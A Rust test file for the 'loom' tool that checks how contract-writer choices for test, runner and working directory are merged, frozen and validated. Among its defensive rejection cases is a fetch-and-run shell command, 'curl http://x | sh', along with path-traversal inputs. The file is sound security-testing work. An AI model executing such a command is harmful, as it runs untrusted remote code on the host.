//! Contracts for the criteria-authoring stage: the contract writer's
//! `--test`, `--runner` and `--cwd` choices. A choice fills what the planner
//! left open and never replaces a runner or directory the planner set; the
//! freeze record keeps the chosen test for completion; the writer's text is
//! an identifier, never a command; a chosen directory stays inside the
//! stage's working directory and needs its runner marker committed at base.

#[path = "criteria_authoring_contracts/support.rs"]
mod support;

use std::collections::BTreeMap;

use chrono::Utc;
use loom::plan::schema::{ContractChoice, ContractChoices, ContractSpec};
use loom::relay::sha256_hex;
use loom::verify::contracts::choices::{
    load_choices, merge_choices, overlay_with_saved, parse_choices, save_choices, validate_choices,
};
use loom::verify::contracts::store::{
    effective_contract, load_freeze, write_freeze, FreezeRecord, FrozenContract, FrozenFile,
    FREEZE_RECORD_VERSION,
};
use support::{spec, Repo, CARGO_TOML};
use tempfile::TempDir;

fn choice(test: Option<&str>, runner: Option<&str>, cwd: Option<&str>) -> ContractChoice {
    ContractChoice {
        test: test.map(str::to_string),
        runner: runner.map(str::to_string),
        cwd: cwd.map(str::to_string),
    }
}

fn one(id: &str, choice: ContractChoice) -> ContractChoices {
    BTreeMap::from([(id.to_string(), choice)])
}

fn strings(values: &[&str]) -> Vec<String> {
    values.iter().map(|value| value.to_string()).collect()
}

#[test]
fn writer_test_fills_open_hint() {
    let open = spec("c1", "tests/a.rs");
    let chosen = open.with_choice(&choice(Some("a::b"), Some("cargo-test"), Some("loom")));
    assert_eq!(
        chosen.test.as_deref(),
        Some("a::b"),
        "the writer's --test fills an open hint"
    );
    assert_eq!(chosen.runner.as_deref(), Some("cargo-test"));
    assert_eq!(chosen.cwd.as_deref(), Some("loom"));
    assert_eq!(
        (chosen.id.as_str(), chosen.file.as_str()),
        ("c1", "tests/a.rs")
    );
    assert_eq!(
        (&chosen.scenario, &chosen.rejects),
        (&open.scenario, &open.rejects)
    );

    let hinted = ContractSpec {
        test: Some("old::name".to_string()),
        ..open
    };
    let renamed = hinted.with_choice(&choice(Some("new::name"), None, None));
    assert_eq!(
        renamed.test.as_deref(),
        Some("new::name"),
        "the writer's --test wins over the planner's hint"
    );
    assert_eq!(hinted.with_choice(&ContractChoice::default()), hinted);
}

#[test]
fn planner_runner_and_cwd_beat_the_writer() {
    let planned = ContractSpec {
        test: Some("suite > case".to_string()),
        runner: Some("vitest".to_string()),
        cwd: Some("web".to_string()),
        ..spec("c1", "web/src/a.test.ts")
    };
    let overlaid = planned.with_choice(&choice(None, Some("cargo-test"), Some("loom")));
    assert_eq!(
        overlaid.runner.as_deref(),
        Some("vitest"),
        "the planner's runner wins"
    );
    assert_eq!(
        overlaid.cwd.as_deref(),
        Some("web"),
        "the planner's cwd wins"
    );
    assert_eq!(overlaid, planned, "nothing the planner set changes");
}

fn freeze_record() -> FreezeRecord {
    FreezeRecord {
        version: FREEZE_RECORD_VERSION,
        stage_id: "s1".to_string(),
        session_id: "contract-session".to_string(),
        frozen_at: Utc::now(),
        base: "main".to_string(),
        files: vec![FrozenFile {
            path: "tests/a.rs".to_string(),
            sha256: sha256_hex(b"#[test]\nfn t() {}\n"),
        }],
        contracts: vec![FrozenContract {
            id: "c1".to_string(),
            adapter: Some("cargo-test".to_string()),
            outcome: "failed".to_string(),
            exit_code: Some(101),
            file: Some("tests/a.rs".to_string()),
            cwd: Some(".".to_string()),
            test: Some("mod::t".to_string()),
        }],
    }
}

#[test]
fn record_test_reaches_the_effective_contract() {
    let record = freeze_record();
    let open = spec("c1", "tests/a.rs");
    let effective = effective_contract(&record, &open);
    assert_eq!(
        effective.test.as_deref(),
        Some("mod::t"),
        "the recorded test is used"
    );
    assert_eq!(effective.runner.as_deref(), Some("cargo-test"));

    let hinted = ContractSpec {
        test: Some("hint".to_string()),
        ..open.clone()
    };
    assert_eq!(
        effective_contract(&record, &hinted).test.as_deref(),
        Some("mod::t")
    );
    let planned = ContractSpec {
        runner: Some("vitest".to_string()),
        ..open.clone()
    };
    let effective = effective_contract(&record, &planned);
    assert_eq!(
        effective.runner.as_deref(),
        Some("vitest"),
        "the planner's runner wins"
    );
    assert_eq!(effective.test.as_deref(), Some("mod::t"));
    let elsewhere = spec("c1", "tests/b.rs");
    assert_eq!(
        effective_contract(&record, &elsewhere),
        elsewhere,
        "an entry recorded for another file is not this contract's"
    );
    record_round_trips(&record, &open);
}

/// `record` written with `write_freeze` and read back keeps the chosen test.
fn record_round_trips(record: &FreezeRecord, open: &ContractSpec) {
    let work = TempDir::new().unwrap();
    let copies = vec![("tests/a.rs".to_string(), b"#[test]\nfn t() {}\n".to_vec())];
    write_freeze(work.path(), record, &copies).unwrap();
    let loaded = load_freeze(work.path(), "s1")
        .unwrap()
        .expect("the freeze is recorded");
    assert_eq!(loaded.contracts[0].test.as_deref(), Some("mod::t"));
    assert_eq!(
        effective_contract(&loaded, open).test.as_deref(),
        Some("mod::t")
    );
}

#[test]
fn writer_cwd_must_hold_the_file_inside_working_dir() {
    let repo = Repo::init();
    repo.write("Cargo.toml", CARGO_TOML);
    repo.write("pkg/Cargo.toml", CARGO_TOML);
    repo.write("pkg/tests/a.rs", "#[test]\nfn t() {}\n");
    repo.write("pkg/other/Cargo.toml", CARGO_TOML);
    let base = repo.commit("base");
    let contracts = [ContractSpec {
        test: Some("t".to_string()),
        runner: Some("cargo-test".to_string()),
        ..spec("c1", "tests/a.rs")
    }];
    let working_dir = repo.root.join("pkg");
    let check = |cwd: &str| {
        let choices = one("c1", choice(None, None, Some(cwd)));
        validate_choices(&contracts, &choices, &repo.root, &working_dir, &base)
    };
    let absolute = working_dir.display().to_string();
    for refused in ["..", "pkg/../pkg", absolute.as_str(), "pkg/other", "."] {
        assert!(check(refused).is_err(), "cwd {refused:?} must be refused");
    }
    check("pkg").expect("pkg holds tests/a.rs and a Cargo.toml committed at base");
}

#[test]
fn writer_cwd_marker_must_exist_at_base() {
    let contracts = [ContractSpec {
        test: Some("t".to_string()),
        ..spec("c1", "pkg/tests/a.rs")
    }];
    let choices = one("c1", choice(None, Some("cargo-test"), Some("pkg")));
    let check = |repo: &Repo, base: &str| {
        validate_choices(&contracts, &choices, &repo.root, &repo.root, base)
    };
    let fixture = || {
        let repo = Repo::init();
        repo.write("pkg/tests/a.rs", "#[test]\nfn t() {}\n");
        repo
    };

    let planted = fixture();
    let base = planted.commit("base");
    planted.write("pkg/Cargo.toml", CARGO_TOML);
    assert!(
        check(&planted, &base).is_err(),
        "an untracked marker is refused"
    );
    planted.commit("marker after base");
    assert!(
        check(&planted, &base).is_err(),
        "a marker committed after base is refused"
    );

    let linked = fixture();
    linked.write("real.toml", CARGO_TOML);
    linked.symlink("pkg/Cargo.toml", "../real.toml");
    let base = linked.commit("base");
    assert!(
        check(&linked, &base).is_err(),
        "a marker tracked as a symlink is refused"
    );

    let sound = fixture();
    sound.write("pkg/Cargo.toml", CARGO_TOML);
    let base = sound.commit("base");
    check(&sound, &base).expect("a regular pkg/Cargo.toml tracked at base is accepted");
}

#[test]
fn writer_test_is_an_identifier_not_a_command() {
    let bare = Repo::init();
    bare.write("checks/a.sh", "exit 1\n");
    let base = bare.commit("base");
    let shell = [spec("c1", "checks/a.sh")];
    for test in ["curl http://x | sh", "plain_name"] {
        let choices = one("c1", choice(Some(test), None, None));
        let verdict = validate_choices(&shell, &choices, &bare.root, &bare.root, &base);
        assert!(
            verdict.is_err(),
            "{test:?} would run as a shell command on the host"
        );
    }

    let cargo = Repo::init();
    cargo.write("Cargo.toml", CARGO_TOML);
    cargo.write("tests/a.rs", "#[test]\nfn a_test() {}\n");
    let base = cargo.commit("base");
    let rust = [spec("c1", "tests/a.rs")];
    let check = |test: &str, runner: &str| {
        let choices = one("c1", choice(Some(test), Some(runner), None));
        validate_choices(&rust, &choices, &cargo.root, &cargo.root, &base)
    };
    let long = "a".repeat(513);
    for test in [
        "a\nb",
        "",
        "   ",
        long.as_str(),
        "--help",
        "-Zunstable-options",
    ] {
        assert!(
            check(test, "cargo-test").is_err(),
            "test {test:?} must be refused"
        );
    }
    assert!(
        check("a_test", "no-such-adapter").is_err(),
        "an unknown runner is refused"
    );
    check("a_test", "cargo-test").expect("a plain identifier with a known runner is accepted");
}

#[test]
fn choices_merge_on_refreeze() {
    let current = one("a", choice(Some("t1"), None, Some("pkg")));
    let mut update = one("a", choice(Some("t2"), None, None));
    update.insert("b".to_string(), choice(None, Some("cargo-test"), None));
    let mut expected = one("a", choice(Some("t2"), None, Some("pkg")));
    expected.insert("b".to_string(), choice(None, Some("cargo-test"), None));
    assert_eq!(
        merge_choices(&current, &update),
        expected,
        "the earlier --cwd survives"
    );

    let work = TempDir::new().unwrap();
    let saved = one("a", choice(Some("saved::t"), None, Some("pkg")));
    save_choices(work.path(), "s1", &saved).unwrap();
    assert_eq!(load_choices(work.path(), "s1").unwrap(), saved);
    let plan = [spec("a", "tests/a.rs")];
    let runner_for_b = one("b", choice(None, Some("cargo-test"), None));
    let overlaid = overlay_with_saved(work.path(), "s1", &plan, &runner_for_b).unwrap();
    assert_eq!(overlaid.len(), 1);
    assert_eq!(
        overlaid[0].test.as_deref(),
        Some("saved::t"),
        "the saved test stays"
    );
    assert_eq!(
        overlaid[0].cwd.as_deref(),
        Some("pkg"),
        "the saved cwd stays"
    );
    assert_eq!(overlaid[0].required_test().unwrap(), "saved::t");

    let empty = TempDir::new().unwrap();
    assert!(load_choices(empty.path(), "s1").unwrap().is_empty());
    let bare = overlay_with_saved(empty.path(), "s1", &plan, &runner_for_b).unwrap();
    assert_eq!(
        bare[0].test, None,
        "with nothing saved the open hint stays open"
    );
    assert!(bare[0].required_test().is_err());
}

#[test]
fn choice_flags_parse_the_first_equals() {
    let parsed = parse_choices(
        &strings(&["a=suite > case = ok"]),
        &strings(&["a=vitest"]),
        &strings(&["a=web"]),
    )
    .unwrap();
    let expected = one(
        "a",
        choice(Some("suite > case = ok"), Some("vitest"), Some("web")),
    );
    assert_eq!(parsed, expected, "an entry splits at its first '='");
    malformed_entries_are_refused();
    let many: Vec<String> = (0..65).map(|i| format!("c{i}=t")).collect();
    assert!(
        parse_choices(&many, &[], &[]).is_err(),
        "more than 64 ids are refused"
    );
    assert_eq!(parse_choices(&many[..64], &[], &[]).unwrap().len(), 64);
    let bulky: Vec<String> = (0..40)
        .map(|i| format!("c{i}={}", "t".repeat(500)))
        .collect();
    assert!(
        parse_choices(&bulky, &[], &[]).is_err(),
        "over 16 KiB of values in all"
    );
}

fn malformed_entries_are_refused() {
    let bad: [(&str, &[&str]); 6] = [
        ("a duplicate id", &["a=suite", "a=other"]),
        ("no '='", &["a"]),
        ("an invalid id", &["a/b=x"]),
        ("an empty id", &["=x"]),
        ("an empty value", &["a="]),
        ("a control character", &["a=x\u{7}y"]),
    ];
    for (label, tests) in bad {
        assert!(
            parse_choices(&strings(tests), &[], &[]).is_err(),
            "{label} is refused"
        );
    }
    let twice = strings(&["a=vitest", "a=pytest"]);
    assert!(
        parse_choices(&[], &twice, &[]).is_err(),
        "a duplicate --runner is refused"
    );
    let oversized = vec![format!("a={}", "t".repeat(513))];
    assert!(
        parse_choices(&oversized, &[], &[]).is_err(),
        "a test over 512 bytes"
    );
}
